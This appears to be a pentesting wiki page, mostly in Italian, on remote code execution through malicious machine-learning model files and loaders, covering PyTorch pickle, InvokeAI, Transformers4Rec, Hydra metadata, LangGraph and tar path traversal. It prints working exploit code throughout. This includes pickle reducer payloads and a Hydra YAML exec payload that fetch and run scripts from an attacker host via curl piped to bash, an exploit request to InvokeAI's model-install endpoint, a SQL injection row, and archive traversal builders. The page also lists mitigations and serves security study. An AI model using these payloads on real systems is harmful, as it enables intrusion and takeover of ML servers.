# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

I modelli di Machine Learning sono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati sulle macchine degli sviluppatori o sui sistemi di produzione per essere usati. In genere i modelli non dovrebbero contenere codice malevolo, ma ci sono alcuni casi in cui il modello può essere usato per eseguire codice arbitrario sul sistema come funzionalità prevista o a causa di una vulnerabilità nella libreria di caricamento del modello.

Al momento della scrittura, questi sono alcuni esempi di questo tipo di vulnerabilità:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Pickle malevolo nel checkpoint del modello porta a code execution (bypassando la protezione `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + download malevolo del modello causa code execution; Java deserialization RCE nella management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Checkpoint non fidato attiva il pickle reducer durante `load_model_trainer_states_from_checkpoint` → code execution nell'ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | La chiave `filter` controllata dall'utente inietta sintassi SQL/JSON-path, `UNION SELECT` fabbrica una falsa riga di checkpoint, poi la deserializzazione `msgpack` importa e chiama codice Python scelto dall'attaccante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Il caricamento del modello da YAML usa `yaml.unsafe_load` (code exec) <br> Il caricamento del modello con layer **Lambda** esegue codice Python arbitrario          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Un modello `.tflite` creato ad arte provoca integer overflow → heap corruption (RCE potenziale)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Il caricamento di un modello tramite `joblib.load` esegue pickle con il payload `__reduce__` dell'attaccante                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` di default consentiva array di oggetti pickled – un `.npy/.npz` malevolo attiva code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Il path degli external-weights del modello ONNX può uscire dalla directory (lettura di file arbitrari) <br> Un tar malevolo del modello ONNX può sovrascrivere file arbitrari (portando a RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Un modello con operatori custom richiede il caricamento di codice nativo dell'attaccante; grafi complessi abusano della logica per eseguire computazioni non intenzionali   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | L'uso della model-load API con `--model-control` abilitato consente relative path traversal per scrivere file (ad esempio, sovrascrivere `.bashrc` per RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Un file modello GGUF malformato causa heap buffer overflows nel parser, consentendo esecuzione di codice arbitrario sul sistema vittima                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Un modello HDF5 (`.h5`) malevolo con codice nel layer Lambda viene ancora eseguito al caricamento (Keras safe_mode non copre il vecchio formato – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Molti strumenti ML (ad esempio, formati di modello basati su pickle, Python `pickle.load`) eseguiranno codice arbitrario incorporato nei file del modello se non mitigati | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | I metadata/config del modello controllati dall'attaccante impostano `_target_` su una callable arbitraria (ad esempio, `builtins.exec`) → eseguita durante il caricamento, anche con formati “safe” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Inoltre, ci sono alcuni modelli Python pickle-based come quelli usati da [PyTorch](https://github.com/pytorch/pytorch/security) che possono essere usati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Quindi, qualsiasi modello basato su pickle può essere particolarmente suscettibile a questo tipo di attacchi, anche se non è elencato nella tabella sopra.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` importa e chiama qualsiasi `_target_` con dotted path in un oggetto di configurazione/metadata. Quando le librerie passano **metadata del modello non fidati** a `instantiate()`, un attaccante può fornire una callable e argomenti che vengono eseguiti immediatamente durante il caricamento del modello (non serve pickle).

Esempio di payload (funziona in `.nemo` `model_config.yaml`, repo `config.json`, o `__metadata__` dentro `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Punti chiave:
- Attivato prima dell'inizializzazione del modello in NeMo `restore_from/from_pretrained`, nei coders HuggingFace di uni2TS e nei loader FlexTok.
- La block-list di stringhe di Hydra è aggirabile tramite percorsi di import alternativi (ad es. `enum.bltns.eval`) o nomi risolti dall'applicazione (ad es. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok inoltre analizza metadata sotto forma di stringa con `ast.literal_eval`, abilitando DoS (esplosione CPU/memoria) prima della chiamata a Hydra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` è una popolare interfaccia web open-source per Stable-Diffusion. Le versioni **5.3.1 – 5.4.2** espongono l'endpoint REST `/api/v2/models/install` che consente agli utenti di scaricare e caricare modelli da URL arbitrari.

Internamente l'endpoint alla fine chiama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando il file fornito è un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` esegue una **pickle deserialization**. Poiché il contenuto proviene direttamente dall’URL controllato dall’utente, un attacker può incorporare un oggetto malevolo con un metodo `__reduce__` personalizzato all’interno del checkpoint; il metodo viene eseguito **durante la deserialization**, portando a **remote code execution (RCE)** sul server InvokeAI.

La vulnerability è stata assegnata come **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Ospita `payload.ckpt` su un server HTTP che controlli (ad esempio `http://ATTACKER/payload.ckpt`).
3. Attiva l'endpoint vulnerabile (non è richiesta autenticazione):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando InvokeAI scarica il file chiama `torch.load()` → il gadget `os.system` viene eseguito e l'attaccante ottiene l'esecuzione di codice nel contesto del processo InvokeAI.

Exploit già pronto: modulo **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizza l'intero flusso.

#### Condizioni

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` raggiungibile dall'attaccante
•  Il processo ha i permessi per eseguire comandi shell

#### Mitigazioni

* Aggiorna a **InvokeAI ≥ 5.4.3** – la patch imposta `scan=True` di default ed esegue la scansione malware prima della deserializzazione.
* Quando carichi checkpoint in modo programmatico usa `torch.load(file, weights_only=True)` oppure il nuovo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Applica allow-list / signature per le sorgenti dei model e avvia il servizio con privilegi minimi.

> ⚠️ Ricorda che **qualsiasi** formato basato su pickle di Python (inclusi molti file `.pt`, `.pkl`, `.ckpt`, `.pth`) è intrinsecamente non sicuro da deserializzare da sorgenti non affidabili.

---

Esempio di una mitigazione ad hoc se devi mantenere in esecuzione versioni InvokeAI più vecchie dietro un reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (parte di Merlin) esponeva un loader di checkpoint non sicuro che chiamava direttamente `torch.load()` su path forniti dall’utente. Poiché `torch.load` si basa su Python `pickle`, un checkpoint controllato da un attaccante può eseguire codice arbitrario tramite un reducer durante la deserializzazione.

Percorso vulnerabile (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Perché questo porta a RCE: in Python pickle, un oggetto può definire un reducer (`__reduce__`/`__setstate__`) che restituisce una callable e argomenti. La callable viene eseguita durante l'unpickling. Se un oggetto del genere è presente in un checkpoint, viene eseguito prima che qualsiasi weight venga usato.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ha sostituito il `torch.load()` diretto con un deserializer ristretto, allow-listed, implementato in `transformers4rec/utils/serialization.py`. Il nuovo loader valida types/fields e impedisce che callable arbitrarie vengano invocate durante il load.

Defensive guidance specifica per i checkpoint PyTorch:
- Non fare unpickle di dati non trusted. Preferisci formati non eseguibili come [Safetensors](https://huggingface.co/docs/safetensors/index) o ONNX quando possibile.
- Se devi usare PyTorch serialization, assicurati di usare `weights_only=True` (supportato nelle versioni più nuove di PyTorch) oppure usa un custom unpickler allow-listed simile alla patch di Transformers4Rec.
- Imporre model provenance/signatures e fare sandbox alla deserialization (seccomp/AppArmor; utente non-root; FS limitato e nessun network egress).
- Monitora processi figli inaspettati dai servizi ML al momento del load del checkpoint; traccia l’uso di `torch.load()`/`pickle`.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carica il model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD di Tencent espone un endpoint `resnet` che deserializza dati controllati dall’utente. ZDI ha confermato che un attacker remoto può indurre una vittima a caricare una pagina/file malevolo, farle inviare un blob serializzato appositamente creato a quell’endpoint e attivare la deserializzazione come `root`, portando al completo compromise.

Il flusso di exploit rispecchia il tipico abuso di pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Qualsiasi gadget raggiungibile durante la deserializzazione (costruttori, `__setstate__`, callback del framework, ecc.) può essere weaponized nello stesso modo, indipendentemente dal fatto che il trasporto fosse HTTP, WebSocket o un file droppato in una directory monitorata.



### LangGraph checkpointer SQLi → MessagePack RCE

Questa chain di attacco è interessante perché l'attaccante **non ha bisogno di caricare un file di modello malevolo**. Invece, l'applicazione espone una **AI-agent persistence API** (`get_state_history(..., filter=...)`) e l'input dell'utente raggiunge il query builder del checkpointer.

#### 1. Structural SQLi nei metadata filter

Un pattern SQLite vulnerabile appariva così:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Il valore viene vincolato più tardi, ma `query_key` viene concatenato nella **stringa del JSON path**, quindi un `'` all’interno della chiave del dizionario esce da `'$.{query_key}'` e inietta SQL. La stessa lezione vale per **JSON paths, identifiers, operators, `LIMIT`, e TTL fields**: i placeholders proteggono solo i valori, non la sintassi strutturale della query.

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

La query restituisce `type` e i byte serializzati di `checkpoint`, che vengono poi consumati come:
```python
self.serde.loads_typed((type, checkpoint))
```
Ciò significa che una SQLi nella clausola `WHERE` può iniettare una **fake result row**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Se successivamente il codice analizza, deserializza, scrive o esegue qualsiasi colonna selezionata, mappa quelle colonne ai loro sink. In questo caso la falsa riga trasforma SQLi in **attacker-controlled deserialization**.

#### 3. Gli hook di estensione MessagePack non sicuri sono equivalenti a code gadgets

Il percorso `msgpack` di LangGraph usava un custom extension hook che unpackava una nested tuple ed eseguiva:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Quindi un oggetto extension MessagePack che codifica qualcosa di equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, risolve `system` e esegue il comando. Quando esamini i framework AI, controlla i **custom MessagePack/JSON/pickle revivers** per import dinamici, reflection o dispatch arbitrario di callable.

#### 4. Schema pratico di audit per i framework agent

Rivedi qualsiasi input controllato dall’utente che raggiunge:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders che generano SQL o frammenti di query Redis
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths che si fidano delle righe restituite dal persistence layer

Questa specifica chain ha colpito deploy self-hosted di LangGraph che usavano **SQLite** o **Redis** checkpointers quando utenti non fidati potevano controllare `filter`. Le versioni patchate indicate nella disclosure erano `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, e `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Come commentato in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la maggior parte dei formati di modelli usati dai diversi framework AI si basa su archivi, di solito `.zip`. Quindi, potrebbe essere possibile abusare di questi formati per eseguire attacchi di path traversal, consentendo di leggere file arbitrari dal sistema su cui il modello viene caricato.

Per esempio, con il seguente codice puoi creare un model che creerà un file nella directory `/tmp` quando viene caricato:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oppure, con il seguente codice puoi creare un model che creerà un symlink alla directory `/tmp` quando verrà caricato:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Approfondimento: deserializzazione .keras e gadget hunting

Per una guida mirata sugli internals di .keras, la Lambda-layer RCE, il problema di import arbitrario in ≤ 3.8 e la scoperta di gadget post-fix all'interno dell'allowlist, vedi:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Riferimenti

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
